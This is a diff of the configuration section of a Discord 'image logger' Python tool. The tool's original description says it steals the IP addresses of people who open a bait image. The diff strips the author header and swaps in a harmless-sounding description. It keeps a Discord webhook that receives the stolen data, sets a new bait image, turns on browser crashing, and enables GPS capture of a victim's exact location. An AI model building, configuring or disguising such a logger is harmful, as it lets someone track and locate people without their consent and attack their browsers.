@@ -1,19 +1,16 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__app__ = "Discord Image bogger"
+__description__ = "Juat a booger"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335620256818790450/BexX9ohWKLPO2mDosenBxGfeaiMAcUwZVlILQGQBklzz4NEeW-y1wnszIKCKMXc5cbnV",
-    "image": "https://in.pinterest.com/pin/899101513091743933/", # You can also have a custom image by using a URL argument
+    "image": "https://media.discordapp.net/attachments/1337827199570677791/1338050986324918313/Screenshot_2025-02-09_130424.png?ex=67a9ac96&is=67a85b16&hm=e49e738d8ab7b40d53774443cee92b95d2f40695a5fb3872f0b355b1b51f47e6&=&format=webp&quality=lossless&width=558&height=526", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,11 +21,11 @@ config = {
     # OPTIONS #
     "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
-        "message": "JB IMAGE OPEN NAI HO RAHA THA TO UNGLI KYU KR RAHA THA AB HAG GAYA PC MOJ KR", # Message to show
+        "doMessage": False, # Enable the custom message?
+        "message": "XXX", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
